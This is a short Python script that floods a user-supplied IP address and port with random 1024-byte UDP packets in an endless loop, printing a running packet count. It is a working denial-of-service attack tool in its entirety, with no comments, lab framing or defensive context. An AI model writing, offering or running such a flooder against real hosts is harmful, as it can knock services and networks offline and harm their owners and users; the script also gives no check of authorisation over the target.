import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
ip = input("Target ip: ")
port = int(input('Port: '))
sent = 0

while 1:
    sock.sendto(bytes, (ip, port))
    print(f"sent {sent} amount of packets to {ip} at port {port}. ")
    sent = sent + 1